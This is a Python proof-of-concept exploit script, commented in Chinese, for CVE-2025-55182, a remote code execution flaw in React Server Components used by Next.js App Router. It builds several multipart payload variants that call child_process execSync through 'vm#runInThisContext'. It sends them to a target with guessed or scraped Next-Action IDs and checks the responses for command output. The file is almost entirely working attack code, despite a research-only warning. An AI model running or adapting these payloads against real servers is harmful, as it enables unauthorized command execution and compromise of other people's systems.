#!/usr/bin/env python3
"""
CVE-2025-55182 漏洞复现 POC
React Server Components 远程代码执行漏洞

影响版本：
- react-server-dom-webpack: 19.0.0 - 19.2.0
- Next.js 15.x, 16.x (使用 App Router)

⚠️ 警告：仅用于安全研究，请勿用于非法用途！
"""

import sys
import urllib.request
import urllib.error
import json

def create_payload_v1(command: str) -> tuple:
    """
    Payload 格式 v1: 使用 $ACTION_REF_0 和 $ACTION_0:0
    """
    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    
    evil_payload = json.dumps({
        "id": "vm#runInThisContext",
        "bound": [f'global.process.mainModule.require("child_process").execSync("{command}").toString()']
    })
    
    parts = []
    parts.append(f'--{boundary}')
    parts.append('Content-Disposition: form-data; name="$ACTION_REF_0"')
    parts.append('')
    parts.append('')
    parts.append(f'--{boundary}')
    parts.append('Content-Disposition: form-data; name="$ACTION_0:0"')
    parts.append('')
    parts.append(evil_payload)
    parts.append(f'--{boundary}--')
    
    body = '\r\n'.join(parts)
    return body.encode('utf-8'), boundary


def create_payload_v2(command: str) -> tuple:
    """
    Payload 格式 v2: 使用 1_$ACTION_REF_1 和 1_$ACTION_1:0
    """
    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    
    evil_payload = json.dumps({
        "id": "vm#runInThisContext",
        "bound": [f'global.process.mainModule.require("child_process").execSync("{command}").toString()']
    })
    
    parts = []
    parts.append(f'--{boundary}')
    parts.append('Content-Disposition: form-data; name="1_$ACTION_REF_1"')
    parts.append('')
    parts.append('')
    parts.append(f'--{boundary}')
    parts.append('Content-Disposition: form-data; name="1_$ACTION_1:0"')
    parts.append('')
    parts.append(evil_payload)
    parts.append(f'--{boundary}--')
    
    body = '\r\n'.join(parts)
    return body.encode('utf-8'), boundary


def create_payload_v3(command: str) -> tuple:
    """
    Payload 格式 v3: 直接注入到 action 参数
    """
    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    
    evil_payload = json.dumps({
        "id": "vm#runInThisContext",
        "bound": [f'global.process.mainModule.require("child_process").execSync("{command}").toString()']
    })
    
    parts = []
    parts.append(f'--{boundary}')
    parts.append('Content-Disposition: form-data; name="$ACTION_ID_"')
    parts.append('')
    parts.append(evil_payload)
    parts.append(f'--{boundary}--')
    
    body = '\r\n'.join(parts)
    return body.encode('utf-8'), boundary


def create_payload_v4() -> tuple:
    """
    Payload 格式 v4: 尝试 require 注入
    """
    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    
    # 直接使用 require 模块标识符
    evil_payload = json.dumps({
        "id": "require#child_process",
        "bound": []
    })
    
    parts = []
    parts.append(f'--{boundary}')
    parts.append('Content-Disposition: form-data; name="$ACTION_REF_0"')
    parts.append('')
    parts.append('')
    parts.append(f'--{boundary}')
    parts.append('Content-Disposition: form-data; name="$ACTION_0:0"')
    parts.append('')
    parts.append(evil_payload)
    parts.append(f'--{boundary}--')
    
    body = '\r\n'.join(parts)
    return body.encode('utf-8'), boundary


def send_exploit(target_url: str, payload: bytes, boundary: str, action_id: str = "test") -> str:
    """发送漏洞利用请求"""
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Next-Action': action_id,
        'Accept': 'text/x-component',
        'User-Agent': 'CVE-2025-55182-POC/1.0',
    }
    
    try:
        req = urllib.request.Request(target_url, data=payload, headers=headers, method='POST')
        with urllib.request.urlopen(req, timeout=10) as response:
            return f"Status {response.status}: {response.read().decode('utf-8', errors='ignore')}"
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8', errors='ignore')
        return f"HTTP {e.code}: {body[:300]}"
    except urllib.error.URLError as e:
        return f"URL Error: {e.reason}"
    except Exception as e:
        return f"Error: {str(e)}"


def test_vulnerability(target: str, endpoint: str = "/dashboard/tools/cve-demo"):
    """测试漏洞"""
    target_url = f"{target.rstrip('/')}{endpoint}"
    
    print("=" * 70)
    print("CVE-2025-55182 漏洞复现测试")
    print("=" * 70)
    print(f"目标地址: {target_url}")
    print()
    
    command = "id" if sys.platform != "darwin" else "whoami"
    
    payloads = [
        ("v1: $ACTION_REF_0 / $ACTION_0:0", create_payload_v1),
        ("v2: 1_$ACTION_REF_1 / 1_$ACTION_1:0", create_payload_v2),
        ("v3: $ACTION_ID_", create_payload_v3),
    ]
    
    action_ids = [
        "a1b2c3d4e5f6",
        "1234567890",
        "test",
        "",
    ]
    
    for payload_name, create_func in payloads:
        print(f"\n[测试] Payload 格式: {payload_name}")
        print("-" * 50)
        
        try:
            payload, boundary = create_func(command)
        except:
            payload, boundary = create_func()
            
        for action_id in action_ids:
            result = send_exploit(target_url, payload, boundary, action_id)
            print(f"  Action-ID '{action_id or '(empty)'}': {result[:100]}...")
            
            # 如果响应中包含命令执行结果的迹象
            if command in result.lower() or "root" in result.lower() or "zch" in result.lower():
                print(f"\n  ⚠️ 可能发现漏洞！响应包含可疑内容")
    
    print()
    print("=" * 70)
    print("测试完成")
    print("=" * 70)
    print()
    print("注意：CVE-2025-55182 漏洞利用可能需要特定条件：")
    print("1. 正确的 Server Action ID（通常是编译时生成的哈希值）")
    print("2. 特定版本的 react-server-dom-webpack/turbopack")
    print("3. 启用了 Server Actions 的 Next.js App Router")
    print()
    print("如果所有测试都失败，可能是：")
    print("- 版本已修复（检查 react-server-dom-* 的版本）")
    print("- 需要获取正确的 Action ID")
    print("- 请求格式与目标环境不兼容")


def get_action_ids_from_page(target_url: str) -> list:
    """尝试从页面获取 Action IDs"""
    try:
        req = urllib.request.Request(target_url, method='GET')
        req.add_header('User-Agent', 'Mozilla/5.0')
        with urllib.request.urlopen(req, timeout=10) as response:
            html = response.read().decode('utf-8', errors='ignore')
            
            # 搜索可能的 action ID 模式
            import re
            patterns = [
                r'actionId["\s:]+([a-f0-9]+)',
                r'\\$ACTION_ID_([a-f0-9]+)',
                r'Next-Action["\s:]+([a-f0-9]+)',
            ]
            
            action_ids = set()
            for pattern in patterns:
                matches = re.findall(pattern, html, re.IGNORECASE)
                action_ids.update(matches)
            
            return list(action_ids)
    except Exception as e:
        print(f"获取 Action IDs 失败: {e}")
        return []


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("用法: python poc-cve-2025-55182.py <目标地址>")
        print("示例: python poc-cve-2025-55182.py http://192.168.0.104:3000")
        sys.exit(1)
    
    target = sys.argv[1]
    endpoint = sys.argv[2] if len(sys.argv) > 2 else "/dashboard/tools/cve-demo"
    
    # 先尝试获取页面中的 action IDs
    print(f"尝试从 {target}{endpoint} 获取 Action IDs...")
    action_ids = get_action_ids_from_page(f"{target}{endpoint}")
    if action_ids:
        print(f"发现 Action IDs: {action_ids}")
    else:
        print("未在页面中发现 Action IDs，使用默认值测试")
    
    print()
    test_vulnerability(target, endpoint)
